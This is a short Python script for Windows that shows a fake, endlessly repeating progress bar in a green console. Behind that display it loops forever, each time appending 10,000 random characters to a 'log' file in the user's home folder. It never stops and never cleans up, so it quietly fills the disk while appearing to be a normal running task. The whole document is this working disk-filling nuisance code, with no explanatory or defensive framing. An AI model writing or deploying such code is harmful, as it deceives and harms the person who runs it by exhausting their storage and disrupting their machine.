import getpass, random, os, string, sys
os.system('color 0a')
cls = lambda: os.system('cls')
step = 1
percent = 0
while True:
	cls()
	num = round(percent / 5)
	print(f'''\nStep {step}\n[{'-' * num}{' ' * (20 - num)}] {percent}%''')
	open(f'C:\\Users\\{getpass.getuser()}\\log', 'a').write(''.join(f'{random.choice(string.printable)}' for _ in range(10000)))
	percent += 1
	if percent > 100:
		percent = 0
		step += 1
